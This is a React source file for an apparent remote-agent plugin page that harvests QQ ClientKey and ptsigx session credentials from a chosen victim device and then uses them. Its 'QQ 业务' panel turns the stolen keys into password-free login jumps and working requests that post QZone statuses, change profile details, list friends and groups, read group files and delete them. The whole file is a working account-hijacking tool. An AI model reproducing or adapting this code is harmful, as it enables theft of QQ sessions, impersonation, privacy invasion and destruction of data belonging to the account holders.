import { useCallback, useEffect, useMemo, useRef, useState, type ReactNode } from 'react';
import { Accordion, Button, Card, Chip, Input, Label, Spinner, Table, Tabs, TextArea, TextField } from '@heroui/react';
import { usePluginHost } from '../../hooks/usePluginHost';

interface QQAccount {
  uin: string;
  nickname?: string;
  clientkey?: string;
  ptsigx?: string;
}

interface QQKeyResult {
  accounts?: QQAccount[];
  error?: string;
}

type TabKey = 'list' | 'biz';

/** QQ 头像（qlogo 支持 https，避免 https 页面出现 mixed-content 拦截）。 */
function avatarUrl(uin: string): string {
  return `https://q2.qlogo.cn/headimg_dl?dst_uin=${uin}&spec=100`;
}

async function copyText(text: string) {
  try {
    await navigator.clipboard.writeText(text);
  } catch {
    // fallback
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    ta.remove();
  }
}

/** 按 uin 合并账号（探测到的账号 + 抓取的 clientkey/ptsigx）。 */
function mergeAccounts(scan: QQAccount[], ck: QQAccount[]): QQAccount[] {
  const map = new Map<string, QQAccount>();
  for (const a of ck) map.set(a.uin, { ...a });
  for (const a of scan) {
    const prev = map.get(a.uin) ?? { uin: a.uin };
    map.set(a.uin, { ...prev, ...a });
  }
  return Array.from(map.values()).sort((a, b) => a.uin.localeCompare(b.uin));
}

/** 探测本机 QQ / 抓取 ClientKey / QQ 业务。 */
export default function QQKeyPage() {
  const { selectedAgent, dispatchTask } = usePluginHost();
  const [tab, setTab] = useState<TabKey>('list');
  const [running, setRunning] = useState(false);
  const [rows, setRows] = useState<QQAccount[]>([]);
  const [err, setErr] = useState<string | null>(null);
  const autoRef = useRef<string | null>(null);

  // 重新扫描：扫描账号 + 抓取 ClientKey，合并进同一张表。
  const rescan = useCallback(async () => {
    if (!selectedAgent) return;
    setRunning(true);
    setErr(null);
    let scan: QQAccount[] = [];
    let ck: QQAccount[] = [];
    try {
      const s = await dispatchTask('com.libra.qqkey', 'scan_accounts', {});
      scan = (s.result as QQKeyResult).accounts ?? [];
    } catch (e) {
      setErr(e instanceof Error ? e.message : '探测失败');
    }
    try {
      const c = await dispatchTask('com.libra.qqkey', 'collect', {});
      ck = (c.result as QQKeyResult).accounts ?? [];
    } catch (e) {
      setErr(e instanceof Error ? e.message : '抓取失败');
    }
    setRows(mergeAccounts(scan, ck));
    setRunning(false);
  }, [selectedAgent, dispatchTask]);

  useEffect(() => {
    if (!selectedAgent) return;
    if (autoRef.current === selectedAgent.id) return;
    autoRef.current = selectedAgent.id;
    rescan();
  }, [selectedAgent, rescan]);

  const copyRow = async (a: QQAccount) => {
    await copyText(`${a.uin} ${a.clientkey ?? ''}`.trim());
  };

  return (
    <div className="space-y-4">
      <Card className="p-6">
        <h1 className="text-xl font-semibold">QQ 业务</h1>

        {/* Tab 栏 + 重新扫描（Tab 在左，按钮在右），每项 160px */}
        <div className="mt-4 flex items-center gap-3">
          <Tabs selectedKey={tab} onSelectionChange={(k) => setTab(String(k) as TabKey)}>
            <Tabs.ListContainer>
              <Tabs.List aria-label="qq tabs">
                <Tabs.Tab id="list" className="w-[160px]">QQ 列表<Tabs.Indicator /></Tabs.Tab>
                <Tabs.Tab id="biz" className="w-[160px]">QQ 业务<Tabs.Indicator /></Tabs.Tab>
              </Tabs.List>
            </Tabs.ListContainer>
          </Tabs>
          <Button variant="primary" isPending={running} isDisabled={!selectedAgent} onPress={rescan}>
            重新扫描
          </Button>
          {!selectedAgent && <Chip size="sm" color="warning">请先在顶部选择设备</Chip>}
        </div>
      </Card>

      {err && <Card className="p-4 border border-danger"><p className="text-danger text-sm">{err}</p></Card>}

      {tab === 'list' && (
        <ListPanel rows={rows} running={running} onCopy={copyRow} />
      )}

      {tab === 'biz' && (
        <BizPanel rows={rows} />
      )}
    </div>
  );
}

// ── 列表：标准 Table（LOGO / QQNumber / ClientKey / 操作）────────────
function ListPanel({ rows, running, onCopy }: {
  rows: QQAccount[]; running: boolean; onCopy: (a: QQAccount) => void;
}) {
  const openQzone = (ptsigx: string) => {
    if (ptsigx) window.open(ptsigx, '_blank', 'noopener,noreferrer');
  };
  if (running) {
    return <Spinner size="lg" />;
  }
  return (
    <Card className="p-4">
      <div className="flex items-center gap-2 mb-3">
        <h2 className="font-semibold">QQ 列表</h2>
        <Chip size="sm" variant="secondary">{rows.length} 个</Chip>
      </div>
      {rows.length === 0 ? (
        <p className="text-sm text-default-500">未发现本机 QQ 数据（Documents\Tencent Files）或 ClientKey。点击「重新扫描」。</p>
      ) : (
        <Table>
          <Table.ScrollContainer>
            <Table.Content aria-label="qq table" className="min-w-[640px]">
              <Table.Header>
                <Table.Column isRowHeader>LOGO</Table.Column>
                <Table.Column>QQNumber</Table.Column>
                <Table.Column>ClientKey</Table.Column>
                <Table.Column>操作</Table.Column>
              </Table.Header>
              <Table.Body>
                {rows.map((a, i) => (
                  <Table.Row key={a.uin || i} id={`row-${a.uin || i}`}>
                    <Table.Cell>
                      <img
                        src={avatarUrl(a.uin)}
                        alt={a.uin}
                        className="size-9 shrink-0 rounded-full object-cover bg-default-100"
                        onError={(e) => { (e.target as HTMLImageElement).style.visibility = 'hidden'; }}
                      />
                    </Table.Cell>
                    <Table.Cell className="font-mono text-sm">{a.uin}</Table.Cell>
                    <Table.Cell className="font-mono text-xs max-w-[300px] break-all">
                      {a.clientkey ? a.clientkey : <span className="text-default-400">-</span>}
                    </Table.Cell>
                    <Table.Cell>
                      <div className="flex items-center gap-2">
                        <Button size="sm" variant="ghost" isDisabled={!a.clientkey} onPress={() => onCopy(a)}>
                          COPY
                        </Button>
                        <Button size="sm" variant="ghost" isDisabled={!a.ptsigx} onPress={() => openQzone(a.ptsigx!)}>
                          QQ 空间
                        </Button>
                      </div>
                    </Table.Cell>
                  </Table.Row>
                ))}
              </Table.Body>
            </Table.Content>
          </Table.ScrollContainer>
        </Table>
      )}
    </Card>
  );
}

// ────────────────────────── QQ 业务（前端实现） ──────────────────────────

// 免登跳转域名（window.open 直接可用，无 CORS）
const BIZ_JUMP: Record<string, string> = {
  'QQ 空间': 'https://user.qzone.qq.com/{uin}/infocenter',
  'QQ 邮箱': 'https://wx.mail.qq.com/list/readtemplate?name=login_page.html',
  '群空间': 'https://qun.qq.com',
  '亲密空间': 'https://ti.qq.com',
  '账户中心': 'https://accounts.qq.com',
  'H5 空间': 'https://h5.qzone.qq.com',
  'ZBVIP': 'https://zb.vip.qq.com/kuikly/category/4350',
};

/** qtlogin buy-jump（换取 QQ 业务 cookie）*/
function jumpUrl(uin: string, key: string, u1: string): string {
  return `https://ssl.ptlogin2.qq.com/jump?ptlang=1033&clientuin=${uin}&clientkey=${key}&u1=${encodeURIComponent(u1)}&source=panelstar&keyindex=19`;
}

/** bkn / g_tk：由 skey 计算（与 qqkeytool 一致）。 */
function getBkn(skey: string): number {
  let hash = 5381;
  for (let i = 0; i < skey.length; i++) hash += (hash << 5) + skey.charCodeAt(i);
  return hash & 2147483647;
}
function getGtk(skey: string): number {
  let hash = 5381;
  for (let i = 0; i < skey.length; i++) hash += (hash << 5) + skey.charCodeAt(i);
  return hash & 0x7fffffff;
}

/** 可选择把业务请求走同源代理（例如 CORS 反代到 qq 域）；默认直连。 */
const QQ_PROXY = (import.meta.env.VITE_QQ_PROXY as string | undefined) || '';

async function qf(url: string, init: RequestInit = {}): Promise<string> {
  const res = await fetch(QQ_PROXY + url, {
    ...init,
    headers: { 'User-Agent': 'Mozilla/5.0', ...(init.headers || {}) },
  });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.text();
}

function BizPanel({ rows }: { rows: QQAccount[] }) {
  const [uin, setUin] = useState('');
  const [key, setKey] = useState('');
  const [log, setLog] = useState<string[]>([]);
  // 业务工具参数（子们）
  const [favorite, setFavorite] = useState('');
  // 说说的文本
  const [ssText, setSsText] = useState('');
  // 改资料
  const [nick, setNick] = useState('');
  const [company, setCompany] = useState('');
  // 群号
  const [qunn, setQunn] = useState('');
  // 亲密目标
  const [targetUin, setTargetUin] = useState('');
  // 文件参数
  const [busId, setBusId] = useState('');
  const [fileId, setFileId] = useState('');

  const withKey = rows.find((r) => r.uin === uin)?.clientkey ?? '';

  const push = (msg: string) => setLog((p) => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p.slice(0, 200)]);

  const bizUin = uin || rows[0]?.uin || '';
  const bizKey = key || withKey || rows.find((r) => r.uin === bizUin)?.clientkey || '';

  const runBiz = async (fn: () => Promise<void>) => {
    try { await fn(); } catch (e) { push(`错误: ${e instanceof Error ? e.message : String(e)}`); }
  };

  const accounts = useMemo(
    () => rows.filter((r) => r.clientkey).map((r) => ({ uin: r.uin, key: r.clientkey! })),
    [rows],
  );

  return (
    <div className="space-y-4">
      {/* 账号选择 */}
      <Card className="p-4">
        <h3 className="font-semibold mb-2">选择 QQ 账号（uin + clientkey，用于身份）</h3>
        <div className="flex flex-wrap items-end gap-3">
          <select
            value={uin}
            onChange={(e) => { setUin(e.target.value); setKey(''); }}
            className="bg-default-100 rounded-lg px-3 py-2 text-sm"
          >
            <option value="">选择账号…</option>
            {accounts.map((a) => <option key={a.uin} value={a.uin}>{a.uin}</option>)}
          </select>
          <TextField variant="secondary" className="w-64">
            <Label className="sr-only">clientkey</Label>
            <Input value={key || bizKey} onChange={(e) => setKey((e.target as HTMLInputElement).value)} placeholder="clientkey（留空自动取该账号）" />
          </TextField>
        </div>
        <p className="text-xs text-default-400 mt-2">
          {bizUin && bizKey ? `当前：${bizUin} / ${bizKey.slice(0, 8)}…` : '请先「重新扫描」并在列表中选取账号。'}
          提示：业务 API 走浏览器跨域请求，受 CORS 限制；可用 <code>VITE_QQ_PROXY</code> 配置同源反代。
        </p>
      </Card>

      {/* 免登跳转（无 CORS） */}
      <Card className="p-4">
        <h3 className="font-semibold mb-2">免登跳转（新窗口打开）</h3>
        <div className="flex flex-wrap gap-2">
          {Object.entries(BIZ_JUMP).map(([name, u1]) => (
            <Button key={name} size="sm" variant="outline"
              isDisabled={!bizUin || !bizKey}
              onPress={() => window.open(jumpUrl(bizUin, bizKey, u1.replace('{uin}', bizUin)), '_blank', 'noopener,noreferrer')}>
              {name}
            </Button>
          ))}
        </div>
      </Card>

      {/* 业务工具 */}
      <Accordion className="w-full">
        <Tool
          title="发 QQ 空间说说" desc="发布一条动态到该账号空间" log={push}
          fields={(
            <TextArea value={ssText} onChange={(e) => setSsText((e.target as HTMLTextAreaElement).value)} placeholder="说说内容" rows={2} />
          )}
          run={() => runBiz(async () => {
            const body = new URLSearchParams({
              qzreferrer: `https://user.qzone.qq.com/${bizUin}/infocenter`,
              syn_tweet_verson: '1', paramstr: '1', pic_template: '', richtype: '',
              richval: '', special_url: '', subrichtype: '', con: `qm${ssText}`,
              feedversion: '1', ver: '1', ugc_right: '1', to_sign: '0', hostuin: bizUin,
              code_version: '1', format: 'fs',
            }).toString();
            const url = `https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?&g_tk=${getGtk(bizKey)}`;
            push(await qf(url, { method: 'POST', body, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }));
          })}
        />
        <Tool
          title="修改 QQ 空间资料" desc="改昵称 / 公司" log={push}
          fields={(
            <div className="flex flex-wrap gap-2">
              <Input value={nick} onChange={(e) => setNick((e.target as HTMLInputElement).value)} placeholder="昵称" className="w-48" />
              <Input value={company} onChange={(e) => setCompany((e.target as HTMLInputElement).value)} placeholder="公司/签名" className="w-48" />
            </div>
          )}
          run={() => runBiz(async () => {
            const body = new URLSearchParams({
              qzreferrer: 'https://user.qzone.qq.com/proxy/domain/qzonestyle.gtimg.cn/qzone/v6/setting/profile/profile.html?tab=base&g_iframeUser=1',
              nickname: nick, emoji: '', sex: '1', birthday: '1984-01-01', province: '', city: '',
              country: '', marriage: '0', bloodtype: '5', hp: '0', hc: '0', hco: '0', career: '',
              company, cp: '0', cc: '0', cb: '', cco: '0', lover: '', islunar: '0', mb: '1',
              uin: bizUin, pageindex: '1', nofeeds: '1', fupdate: '1',
            }).toString();
            const url = `https://h5.qzone.qq.com/proxy/domain/w.qzone.qq.com/cgi-bin/user/cgi_apply_updateuserinfo_new?&g_tk=${getGtk(bizKey)}`;
            push(await qf(url, { method: 'POST', body, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }));
          })}
        />
        <Tool
          title="好友列表" desc="获取该账号 QQ 空间好友列表（原始返回）" log={push}
          fields={null}
          run={() => runBiz(async () => {
            const rd = `0.${Date.now()}`;
            const gtk = getGtk(bizKey);
            const url = `https://user.qzone.qq.com/proxy/domain/r.qzone.qq.com/cgi-bin/tfriend/friend_ship_manager.cgi?uin=${bizUin}&do=1&rd=${rd}&fupdate=1&clean=1&g_tk=${gtk}`;
            push(await qf(url, { headers: { Referer: 'https://user.qzone.qq.com/', Origin: 'https://user.qzone.qq.com' } }));
          })}
        />
        <Tool
          title="群组列表" desc="获取该账号加入的 QQ 群列表" log={push}
          fields={null}
          run={() => runBiz(async () => {
            const url = `http://qun.qq.com/cgi-bin/qun_mgr/get_group_list?bkn=${getBkn(bizKey)}`;
            push(await qf(url));
          })}
        />
        <Tool
          title="群公告列表" desc="获取指定群公告" log={push}
          fields={(
            <Input value={qunn} onChange={(e) => setQunn((e.target as HTMLInputElement).value)} placeholder="群号" className="w-48" />
          )}
          run={() => runBiz(async () => {
            const body = `bkn=${getBkn(bizKey)}&qid=${qunn}&ft=23&s=-1&n=10&ni=1&i=1`;
            push(await qf('https://web.qun.qq.com/cgi-bin/announce/get_t_list', { method: 'POST', body, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }));
          })}
        />
        <Tool
          title="群文件列表" desc="获取指定群文件" log={push}
          fields={(
            <Input value={qunn} onChange={(e) => setQunn((e.target as HTMLInputElement).value)} placeholder="群号" className="w-48" />
          )}
          run={() => runBiz(async () => {
            const body = `gc=${qunn}&bkn=${getBkn(bizKey)}&start_index=0&cnt=50&filter_code=0&folder_id=/&show_onlinedoc_folder=1`;
            push(await qf('https://pan.qun.qq.com/cgi-bin/group_file/get_file_list', { method: 'POST', body, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }));
          })}
        />
        <Tool
          title="删除群文件" desc="bus_id + file_id" log={push}
          fields={(
            <div className="flex flex-wrap gap-2">
              <Input value={qunn} onChange={(e) => setQunn((e.target as HTMLInputElement).value)} placeholder="群号" className="w-40" />
              <Input value={busId} onChange={(e) => setBusId((e.target as HTMLInputElement).value)} placeholder="bus_id" className="w-40" />
              <Input value={fileId} onChange={(e) => setFileId((e.target as HTMLInputElement).value)} placeholder="file_id" className="w-40" />
            </div>
          )}
          run={() => runBiz(async () => {
            const body = `src=qpan&gc=${qunn}&bkn=${getBkn(bizKey)}&bus_id=${busId}&file_id=${fileId}&app_id=4&parent_folder_id=/&file_list=${encodeURIComponent(`{"file_list":[{"gc":${qunn},"app_id":4,"bus_id":${busId},"file_id":"${fileId}","parent_folder_id":"/"}]}`)}`;
            push(await qf('http://pan.qun.qq.com/cgi-bin/group_file/delete_file', { method: 'POST', body, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }));
          })}
        />
        <Tool
          title="查看好友亲密度" desc="target_uin" log={push}
          fields={(
            <Input value={targetUin} onChange={(e) => setTargetUin((e.target as HTMLInputElement).value)} placeholder="目标 uin" className="w-48" />
          )}
          run={() => runBiz(async () => {
            const url = `https://h5.qzone.qq.com/close/friendship/${targetUin}?_wv=16777219&source=myfriend`;
            push(await qf(url));
          })}
        />
        <Tool
          title="设置/移除特别关心" desc="special: 1 设置 / 0 移除" log={push}
          fields={(
            <div className="flex flex-wrap gap-2">
              <Input value={targetUin} onChange={(e) => setTargetUin((e.target as HTMLInputElement).value)} placeholder="目标 uin" className="w-48" />
              <Input value={favorite} onChange={(e) => setFavorite((e.target as HTMLInputElement).value)} placeholder="action 0/1" className="w-20" />
            </div>
          )}
          run={() => runBiz(async () => {
            const body = JSON.stringify({ action: Number(favorite || 1), special: { allnum: 1, datalist: [{ uin: Number(targetUin) }] } });
            const url = `https://h5.qzone.qq.com/webapp/json/vpageCover_v2/setCareList?t=0.${Date.now()}&g_tk=${getGtk(bizKey)}`;
            push(await qf(url, { method: 'POST', body, headers: { 'Content-Type': 'application/json' } }));
          })}
        />
      </Accordion>

      {/* 执行日志 */}
      <Card className="p-4">
        <h3 className="font-semibold mb-2">执行日志</h3>
        <div className="bg-black rounded-lg p-3 max-h-72 overflow-auto font-mono text-xs text-green-400">
          {log.length === 0 ? <span className="text-neutral-500">// 选择工具执行，返回显示在这里</span> : log.map((l, i) => (
            <div key={i} className="whitespace-pre-wrap break-all leading-5">{l}</div>
          ))}
        </div>
      </Card>
    </div>
  );
}

/** 一个可展开的业务工具（Accordion 项）。 */
function Tool({ title, desc, fields, run }: {
  title: string; desc: string; fields: ReactNode | null;
  run: () => void | Promise<void>; log?: (m: string) => void;
}) {
  return (
    <Accordion.Item key={title}>
      <Accordion.Heading>
        <Accordion.Trigger>
          <span className="font-semibold">{title}</span>
          <span className="text-xs text-default-500 ml-2">{desc}</span>
          <Accordion.Indicator />
        </Accordion.Trigger>
      </Accordion.Heading>
      <Accordion.Panel>
        <Accordion.Body>
          <div className="space-y-2">
            {fields}
            <Button size="sm" variant="primary" onPress={run}>执行</Button>
          </div>
        </Accordion.Body>
      </Accordion.Panel>
    </Accordion.Item>
  );
}